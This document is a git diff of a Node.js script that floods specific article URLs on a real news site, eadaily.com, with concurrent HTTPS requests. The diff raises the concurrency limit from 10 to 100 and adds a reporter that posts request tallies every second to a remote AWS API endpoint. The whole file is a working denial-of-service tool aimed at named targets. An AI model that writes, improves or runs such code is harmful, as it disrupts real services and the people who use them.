@@ -1,4 +1,5 @@
-const http = require('https')
+const https = require('https')
+const http = require('http')
 
 var targets = [
     { hostname: 'eadaily.com', path:  '/ru/news/2022/02/26/posolstvo-ssha-udalilo-s-sayta-dokumenty-o-biolaboratoriyah-na-ukraine'},
@@ -7,9 +8,10 @@ var targets = [
     { hostname: 'eadaily.com', path:  '/ru/news/2022/02/26/prezident-pridnestrovya-obratilsya-k-ukraincam-ne-verte-lzhivym-smi'}
 ];
 
-const results = {
+const total = {};
+const current = {
     error: 0
-};
+}
 
 const getDurationInMilliseconds = (start) => {
     const NS_PER_SEC = 1e9
@@ -19,9 +21,39 @@ const getDurationInMilliseconds = (start) => {
     return (diff[0] * NS_PER_SEC + diff[1]) / NS_TO_MS
 }
 
-var CONCURRENCY_LIMIT = 10
+var CONCURRENCY_LIMIT = 100
 var queue = []
-//
+
+setInterval(() => {
+    const data = {
+        ...current
+    }
+
+    Object.keys(current).forEach(key => {
+        if (!total[key]) {
+            total[key] = 0;
+        }
+
+        total[key] += current[key];
+        current[key] = 0;
+    })
+
+    const options = {
+        hostname: 'vz8hut3dbj.execute-api.eu-central-1.amazonaws.com',
+        path: '/dev',
+        port: 443,
+        method: 'POST'
+    }
+
+    const req = https.request(options, () => {
+        console.log('SENT LOG RESULTS');
+    })
+
+    req.write(JSON.stringify(data));
+
+    req.end()
+}, 1000)
+
 async function fetchWithTimeout(resource) {
     return new Promise((resolve) => {
         const start = process.hrtime()
@@ -39,16 +71,17 @@ async function fetchWithTimeout(resource) {
 
         const result = { path: `${options.hostname}${options.path}` };
 
-        const req = http.request(options, res => {
+        const req = https.request(options, res => {
             result.statusCode = res.statusCode;
             result.cacheStatus = res.headers['x-cache-status'];
             clearTimeout(id);
             result.durationInMilliseconds = getDurationInMilliseconds (start)
-            if (!results[res.statusCode]) {
-                results[res.statusCode] = 0;
+
+            if (!current[res.statusCode]) {
+                current[res.statusCode] = 0;
             }
 
-            results[res.statusCode] += 1;
+            current[res.statusCode] += 1;
 
             resolve(result);
         })
@@ -58,7 +91,7 @@ async function fetchWithTimeout(resource) {
             clearTimeout(id);
             result.durationInMilliseconds = getDurationInMilliseconds (start)
 
-            results.error += 1;
+            current.error += 1;
             resolve(result);
         })
 
@@ -75,7 +108,7 @@ async function flood(target) {
             fetchWithTimeout(target)
                 .then((response) => {
                     console.clear();
-                    console.log(results)
+                    console.log(total)
                     console.log(response)
                 })
 
@@ -83,7 +116,7 @@ async function flood(target) {
         )
     }
 }
-//
+
 targets.forEach((target) => {
     flood(target)
 })
